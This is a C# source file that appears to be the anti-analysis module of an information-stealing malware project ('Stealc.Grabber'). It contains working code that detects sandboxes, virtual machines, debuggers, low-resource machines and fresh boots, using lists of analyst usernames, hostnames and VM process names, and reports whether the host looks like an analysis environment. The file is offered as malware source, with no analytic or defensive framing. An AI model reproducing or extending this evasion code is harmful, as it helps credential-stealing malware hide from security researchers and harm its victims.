namespace Stealc.Grabber.Core;

public sealed class AntiAnalysis
{
    private static readonly string[] SandboxUsernames =
        ["sandbox", "malware", "virus", "sample", "test", "john doe", "user", "cuckoo", "analyst"];

    private static readonly string[] SandboxHostnames =
        ["sandbox", "cuckoo", "vmware", "virtualbox", "analysis", "maltest", "happyisland"];

    private static readonly string[] VmArtifacts =
        ["vmtoolsd", "vmwaretray", "vboxservice", "vboxtray", "qemu-ga", "xenservice"];

    public AnalysisReport Check()
    {
        var flags = new List<string>();

        if (IsVmUsername()) flags.Add("sandbox_username");
        if (IsVmHostname()) flags.Add("sandbox_hostname");
        if (HasVmProcesses()) flags.Add("vm_processes");
        if (IsDebuggerPresent()) flags.Add("debugger");
        if (IsLowResourceMachine()) flags.Add("low_resources");
        if (HasRecentUptime()) flags.Add("fresh_boot");

        return new AnalysisReport
        {
            IsSuspicious = flags.Count > 0,
            Flags = flags,
            CheckedAt = DateTimeOffset.UtcNow
        };
    }

    private static bool IsVmUsername() =>
        SandboxUsernames.Any(s => Environment.UserName.Contains(s, StringComparison.OrdinalIgnoreCase));

    private static bool IsVmHostname() =>
        SandboxHostnames.Any(s => Environment.MachineName.Contains(s, StringComparison.OrdinalIgnoreCase));

    private static bool HasVmProcesses()
    {
        try
        {
            var names = System.Diagnostics.Process.GetProcesses().Select(p => p.ProcessName.ToLowerInvariant());
            return VmArtifacts.Any(vm => names.Contains(vm));
        }
        catch { return false; }
    }

    private static bool IsDebuggerPresent() => System.Diagnostics.Debugger.IsAttached;

    private static bool IsLowResourceMachine() => Environment.ProcessorCount <= 1;

    private static bool HasRecentUptime() => Environment.TickCount64 < 120_000;
}

public sealed class AnalysisReport
{
    public bool IsSuspicious { get; init; }
    public List<string> Flags { get; init; } = [];
    public DateTimeOffset CheckedAt { get; init; }
}
